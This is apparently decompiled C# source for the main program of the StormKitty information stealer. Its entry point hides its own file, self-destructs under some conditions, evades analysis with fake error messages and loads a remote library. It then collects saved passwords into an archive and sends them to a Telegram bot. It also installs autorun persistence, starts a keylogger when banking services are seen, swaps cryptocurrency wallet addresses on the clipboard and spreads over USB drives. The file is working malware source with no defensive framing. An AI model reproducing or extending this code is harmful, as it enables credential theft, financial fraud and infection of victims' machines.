﻿using System;
using System.IO;
using System.Net;
using System.Threading;
using Stealer;
using StormKitty.Implant;
using StormKitty.Telegram;

namespace StormKitty
{
	// Token: 0x02000068 RID: 104
	internal class Program
	{
		// Token: 0x0600018D RID: 397 RVA: 0x0000C404 File Offset: 0x0000A604
		[STAThread]
		private static void Main(string[] args)
		{
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			ServicePointManager.DefaultConnectionLimit = 9999;
			MutexControl.Check();
			if (!Startup.IsFromStartup())
			{
				Startup.HideFile(null);
			}
			if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
			{
				SelfDestruct.Melt();
			}
			if (Config.StartDelay == "1")
			{
				StartDelay.Run();
			}
			if (AntiAnalysis.Run())
			{
				AntiAnalysis.FakeErrorMessage();
			}
			Directory.SetCurrentDirectory(Paths.lappdata);
			if (!Libs.LoadRemoteLibrary(Libs.ZipLib))
			{
				AntiAnalysis.FakeErrorMessage();
			}
			Config.Init();
			if (!StormKitty.Telegram.Report.TokenIsValid())
			{
				SelfDestruct.Melt();
			}
			string text = Filemanager.CreateArchive(Passwords.Save(), true);
			Console.WriteLine(text);
			StormKitty.Telegram.Report.SendReport(text);
			if (Config.Autorun == "1" && !Startup.IsInstalled() && !Startup.IsFromStartup())
			{
				Startup.Install();
			}
			if (Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1")
			{
				Console.WriteLine("Starting keylogger modules...");
				Thread mainThread = WindowManager.MainThread;
				mainThread.SetApartmentState(ApartmentState.STA);
				mainThread.Start();
			}
			if (!(Config.ClipperModule == "1") || !(Config.Autorun == "1"))
			{
				return;
			}
			new Thread(delegate()
			{
				Program.GetUSB();
			}).Start();
			for (;;)
			{
				Bitcoin.GetBitcoinWhile();
				Etherium.GetEtheriumWhile();
				LiteCoin.GetLiteCoinWhile();
				Monero.GetMoneroWhile();
				Thread.Sleep(500);
			}
		}

		// Token: 0x0600018E RID: 398 RVA: 0x0000C59B File Offset: 0x0000A79B
		public static void GetUSB()
		{
			if (Config.usbspread == "1")
			{
				USBInstaller.GetUSB();
			}
		}
	}
}
